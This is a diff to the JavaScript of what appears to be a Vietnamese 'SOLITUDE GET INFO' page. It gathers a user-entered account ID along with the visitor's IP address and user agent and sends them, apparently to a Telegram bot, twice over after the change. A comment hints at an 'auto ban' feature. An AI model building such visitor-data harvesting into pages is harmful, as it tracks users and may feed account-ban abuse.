@@ -185,7 +185,13 @@
             const currentID = document.getElementById('uid_entry').value.trim() || "Chưa nhập ID";
             const uaMsg = `🔍 **SOLITUDE GET INFO**\n━━━━━━━━━━━━━━━━━━\n🆔 **ID ACC:** \`${currentID}\`\n🌐 **IP:** \`${userIP}\`\n📱 **UA:** \`${ua}\`\n━━━━━━━━━━━━━━━━━━`;
             sendTele(uaMsg);
-            Swal.fire({ html: '<h2 class="swal-neon-title">INFO SENT</h2>', background: '#0a0a0f', timer: 1500, showConfirmButton: false });
+
+        
+        sendTele(uaMsg);            document.getElementById('uid_entry').value = '';
+            Swal.fire({
+                html: '<h2 class="swal-neon-title">INFO SENT TO SOLITUDE SERVER</h2><p style="color:#aaa; font-size:12px;">GET THÀNH CÔNG LIÊN HỆ ADMIN DUYỆT.</p>',
+                background: '#0a0a0f', timer: 2500, showConfirmButton: false
+            });
         }
 
         // --- CHỨC NĂNG CHÍNH: XÁC THỰC & AUTO BAN ---
